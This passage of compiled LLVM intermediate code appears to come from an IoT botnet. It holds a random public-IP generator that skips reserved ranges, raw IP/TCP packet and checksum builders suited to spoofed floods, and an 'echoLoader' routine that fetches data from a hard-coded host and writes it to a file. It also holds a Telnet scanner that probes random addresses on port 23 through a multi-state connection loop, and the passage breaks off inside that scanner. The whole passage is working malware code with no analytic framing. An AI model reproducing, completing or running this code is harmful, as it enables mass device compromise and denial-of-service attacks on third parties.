  %or.cond204 = and i1 %or.cond98, %or.cond108218
  br i1 %or.cond204, label %.critedge.backedge, label %82

; <label>:82:                                     ; preds = %78
  %83 = icmp eq i8 %30, 63
  %84 = icmp eq i8 %51, -115
  %or.cond110 = and i1 %83, %84
  %85 = icmp eq i8 %48, -15
  %or.cond112 = and i1 %or.cond110, %85
  br i1 %or.cond112, label %.critedge.backedge, label %86

; <label>:86:                                     ; preds = %82
  %87 = icmp eq i8 %30, 69
  %88 = icmp eq i8 %51, 30
  %or.cond114 = and i1 %87, %88
  %89 = icmp eq i8 %48, -64
  %90 = icmp eq i8 %48, -12
  %or.cond120219 = or i1 %89, %90
  %or.cond205 = and i1 %or.cond114, %or.cond120219
  br i1 %or.cond205, label %.critedge.backedge, label %91

; <label>:91:                                     ; preds = %86
  %92 = icmp eq i8 %51, -59
  %or.cond122 = and i1 %87, %92
  %93 = icmp eq i8 %48, -128
  %or.cond124 = and i1 %or.cond122, %93
  br i1 %or.cond124, label %.critedge.backedge, label %94

; <label>:94:                                     ; preds = %91
  %95 = icmp eq i8 %30, -94
  %96 = icmp eq i8 %51, -5
  %or.cond126 = and i1 %95, %96
  %97 = icmp eq i8 %48, 120
  %or.cond128 = and i1 %or.cond126, %97
  br i1 %or.cond128, label %.critedge.backedge, label %98

; <label>:98:                                     ; preds = %94
  %99 = icmp eq i8 %30, -83
  %100 = icmp eq i8 %51, -48
  %or.cond130 = and i1 %99, %100
  %101 = icmp eq i8 %48, -76
  %or.cond136220 = or i1 %93, %101
  %102 = icmp eq i8 %48, -6
  %or.cond140221 = or i1 %102, %or.cond136220
  %or.cond207 = and i1 %or.cond130, %or.cond140221
  br i1 %or.cond207, label %.critedge.backedge, label %103

; <label>:103:                                    ; preds = %98
  %104 = icmp eq i8 %51, -69
  %or.cond142 = and i1 %50, %104
  %or.cond144 = and i1 %or.cond142, %63
  br i1 %or.cond144, label %.critedge.backedge, label %105

; <label>:105:                                    ; preds = %103
  %106 = icmp eq i8 %51, -52
  %or.cond146 = and i1 %56, %106
  %or.cond148 = and i1 %or.cond146, %85
  br i1 %or.cond148, label %.critedge.backedge, label %107

; <label>:107:                                    ; preds = %105
  %108 = icmp eq i8 %30, -52
  %109 = icmp eq i8 %51, 10
  %or.cond150 = and i1 %108, %109
  %110 = icmp eq i8 %48, -96
  %or.cond152 = and i1 %or.cond150, %110
  br i1 %or.cond152, label %.critedge.backedge, label %111

; <label>:111:                                    ; preds = %107
  %112 = icmp eq i8 %51, 12
  %or.cond154 = and i1 %108, %112
  %or.cond156 = and i1 %or.cond154, %89
  br i1 %or.cond156, label %.critedge.backedge, label %113

; <label>:113:                                    ; preds = %111
  %114 = icmp eq i8 %30, -48
  %115 = icmp eq i8 %51, 110
  %or.cond158 = and i1 %114, %115
  %116 = or i8 %48, 8
  %117 = icmp eq i8 %116, 72
  %or.cond208 = and i1 %or.cond158, %117
  %118 = icmp eq i8 %51, 67
  %or.cond166 = and i1 %114, %118
  %or.cond209 = or i1 %or.cond166, %or.cond208
  br i1 %or.cond209, label %.critedge.backedge, label %119

; <label>:119:                                    ; preds = %113
  %120 = icmp eq i8 %30, 94
  %121 = icmp eq i8 %51, 102
  %or.cond168 = and i1 %120, %121
  %122 = icmp eq i8 %48, 48
  %or.cond170 = and i1 %or.cond168, %122
  br i1 %or.cond170, label %.critedge.backedge, label %123

; <label>:123:                                    ; preds = %119
  %124 = icmp eq i8 %30, 93
  %125 = icmp eq i8 %51, -82
  %or.cond172 = and i1 %124, %125
  %126 = icmp eq i8 %48, 88
  %or.cond174 = and i1 %or.cond172, %126
  br i1 %or.cond174, label %.critedge.backedge, label %127

; <label>:127:                                    ; preds = %123
  %128 = icmp eq i8 %30, 89
  %129 = icmp eq i8 %51, -8
  %or.cond176 = and i1 %128, %129
  %130 = or i8 %48, 2
  %131 = icmp eq i8 %130, -82
  %.off226 = add i8 %48, 87
  %132 = icmp ult i8 %.off226, 2
  %133 = or i1 %132, %131
  %or.cond212 = and i1 %or.cond176, %133
  br i1 %or.cond212, label %.critedge.backedge, label %134

; <label>:134:                                    ; preds = %127
  %or.cond194 = and i1 %or.cond176, %110
  %135 = icmp ugt i8 %30, -33
  %or.cond196 = or i1 %135, %or.cond194
  br i1 %or.cond196, label %.critedge.backedge, label %136

; <label>:136:                                    ; preds = %134
  %137 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %137, i8 0, i64 16, i32 16, i1 false)
  %138 = zext i8 %30 to i32
  %139 = zext i8 %51 to i32
  %140 = zext i8 %48 to i32
  %141 = and i32 %28, 255
  %142 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %137, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %138, i32 %139, i32 %140, i32 %141)
  br label %143

; <label>:143:                                    ; preds = %136, %8
  %.sink = phi i8* [ %137, %136 ], [ %10, %8 ]
  %144 = call i32 @inet_addr(i8* %.sink) #3
  ret i32 %144
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %8 = tail call noalias i8* @malloc(i64 44) #3
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #3
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i64 0, i64 0)) #3
  tail call void @exit(i32 1) #17
  unreachable

; <label>:8:                                      ; preds = %2
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #3
  %17 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %21 = bitcast i32* %4 to i8*
  %22 = call i32 @setsockopt(i32 %20, i32 6, i32 1, i8* nonnull %21, i32 4) #3
  %23 = icmp eq i32 %20, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %8
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i64 0, i64 0)) #19
  call void @exit(i32 1) #17
  unreachable

; <label>:25:                                     ; preds = %8
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %20, %struct.sockaddr* nonnull %26, i32 16) #3
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i64 0, i64 0)) #19
  call void @exit(i32 1) #17
  unreachable

; <label>:30:                                     ; preds = %25
  ret i32 %20
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #12

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = tail call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 80)
  %3 = tail call i64 @write(i32 %2, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i64 0, i64 0), i64 13) #3
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 512, i32 16, i1 false)
  %5 = call i64 @read(i32 %2, i8* nonnull %4, i64 511) #3
  %6 = icmp eq i64 %5, 0
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %7 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i64 0, i64 0))
  %fputs = call i32 @fputs(i8* nonnull %4, %struct._IO_FILE* %7)
  %8 = tail call i32 @fclose(%struct._IO_FILE* %7)
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 512, i32 16, i1 false)
  %9 = call i64 @read(i32 %2, i8* nonnull %4, i64 511) #3
  %10 = icmp eq i64 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %11 = tail call i32 @shutdown(i32 %2, i32 2) #3
  %12 = tail call i32 @close(i32 %2) #3
  ret void
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner() local_unnamed_addr #13 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca <2 x i64>, align 16
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph341.preheader, label %._crit_edge

.lr.ph341.preheader:                              ; preds = %0
  br label %.lr.ph341

.lr.ph341:                                        ; preds = %.lr.ph341.preheader, %.lr.ph341
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph341 ], [ 0, %.lr.ph341.preheader ]
  %23 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %23, align 1
  %24 = tail call noalias i8* @malloc(i64 1024) #3
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %24, i8** %25, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %26 = icmp slt i64 %indvars.iv.next, %20
  br i1 %26, label %.lr.ph341, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph341
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %27 = tail call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i64 0, i64 0)) #3
  store <2 x i64> <i64 5, i64 0>, <2 x i64>* %6, align 16
  %28 = bitcast <2 x i64>* %6 to i8*
  %29 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %22, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %726, %.lr.ph.preheader
  %.1339 = phi i32 [ %.mux, %726 ], [ 0, %.lr.ph.preheader ]
  %33 = sext i32 %.1339 to i64
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 2
  %36 = load i8, i8* %35, align 8
  switch i8 %36, label %726 [
    i8 0, label %37
    i8 1, label %87
    i8 2, label %137
    i8 3, label %230
    i8 4, label %253
    i8 5, label %361
    i8 6, label %384
    i8 7, label %565
    i8 8, label %575
    i8 9, label %585
    i8 10, label %610
    i8 11, label %614
    i8 12, label %624
  ]

; <label>:37:                                     ; preds = %.lr.ph
  %38 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %39 = load i8*, i8** %38, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1024, i32 1, i1 false)
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 0
  br i1 %42, label %49, label %43

; <label>:43:                                     ; preds = %37
  %44 = bitcast i8** %38 to i64*
  %45 = load i64, i64* %44, align 8
  %46 = bitcast %struct.telstate_t* %34 to i8*
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 32, i32 16, i1 false)
  store i64 %45, i64* %44, align 8
  %47 = call i32 @getRandomPublicIP()
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  store i32 %47, i32* %48, align 4
  br label %62

; <label>:49:                                     ; preds = %37
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %51 = load i8, i8* %50, align 1
  %52 = add i8 %51, 1
  store i8 %52, i8* %50, align 1
  %53 = icmp eq i8 %52, 13
  br i1 %53, label %54, label %._crit_edge342

._crit_edge342:                                   ; preds = %49
  %.phi.trans.insert = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %.pre = load i8, i8* %.phi.trans.insert, align 2
  br label %58

; <label>:54:                                     ; preds = %49
  store i8 0, i8* %50, align 1
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %56 = load i8, i8* %55, align 2
  %57 = add i8 %56, 1
  store i8 %57, i8* %55, align 2
  br label %58

; <label>:58:                                     ; preds = %._crit_edge342, %54
  %59 = phi i8 [ %.pre, %._crit_edge342 ], [ %57, %54 ]
  %60 = icmp eq i8 %59, 4
  br i1 %60, label %61, label %._crit_edge343

._crit_edge343:                                   ; preds = %58
  %.phi.trans.insert344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  %.pre345 = load i32, i32* %.phi.trans.insert344, align 4
  br label %62

; <label>:61:                                     ; preds = %58
  store i8 1, i8* %40, align 1
  br label %726

; <label>:62:                                     ; preds = %._crit_edge343, %43
  %63 = phi i32 [ %.pre345, %._crit_edge343 ], [ %47, %43 ]
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  store i32 %63, i32* %30, align 4
  %64 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  store i32 %64, i32* %65, align 16
  %66 = call i32 @setsockopt(i32 %64, i32 1, i32 20, i8* nonnull %28, i32 16) #3
  %67 = load i32, i32* %65, align 16
  %68 = call i32 @setsockopt(i32 %67, i32 1, i32 21, i8* nonnull %28, i32 16) #3
  %69 = load i32, i32* %65, align 16
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %726, label %71

; <label>:71:                                     ; preds = %62
  %72 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 3, i8* null) #3
  %73 = or i32 %72, 2048
  %74 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 4, i32 %73) #3
  %75 = load i32, i32* %65, align 16
  %76 = call i32 @connect(i32 %75, %struct.sockaddr* nonnull %31, i32 16) #3
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %85

; <label>:78:                                     ; preds = %71
  %79 = tail call i32* @__errno_location() #18
  %80 = load i32, i32* %79, align 4
  %81 = icmp eq i32 %80, 115
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %78
  %83 = load i32, i32* %65, align 16
  %84 = call i32 @sclose(i32 %83)
  store i8 1, i8* %40, align 1
  br label %726

; <label>:85:                                     ; preds = %78, %71
  store i8 1, i8* %35, align 8
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  store i32 0, i32* %86, align 4
  br label %726

; <label>:87:                                     ; preds = %.lr.ph
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  %89 = load i32, i32* %88, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %87
  %92 = call i64 @time(i64* null) #3
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %88, align 4
  br label %94

; <label>:94:                                     ; preds = %87, %91
  %95 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %29) #3, !srcloc !19
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %97 = load i32, i32* %96, align 16
  %98 = srem i32 %97, 64
  %99 = zext i32 %98 to i64
  %100 = shl i64 1, %99
  %101 = sdiv i32 %97, 64
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %102
